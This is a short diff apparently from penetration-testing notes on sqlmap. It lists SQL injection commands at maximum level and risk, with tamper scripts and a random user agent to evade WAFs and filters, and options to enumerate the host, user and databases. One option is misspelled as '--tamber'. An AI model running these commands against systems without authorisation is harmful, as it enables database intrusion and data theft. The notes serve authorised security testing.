@@ -33,3 +33,6 @@ sqlmap -r req3.txt -p commitment --force-ssl --level 5 --risk 3 --dbms=”MYSQL�
 --no-cast --> to avoid use cast-alike statements during data fetching
 --tamber --> to evade filters and WAF’s
 "--hostname --current-user --current-db --dbs" --> to retrieve info about the database
+
+
+python3 sqlmap.py -r request --batch --random-agent --tamper=space2comment --level=5 --risk=3 --drop-set-cookie --threads 10 --dbs
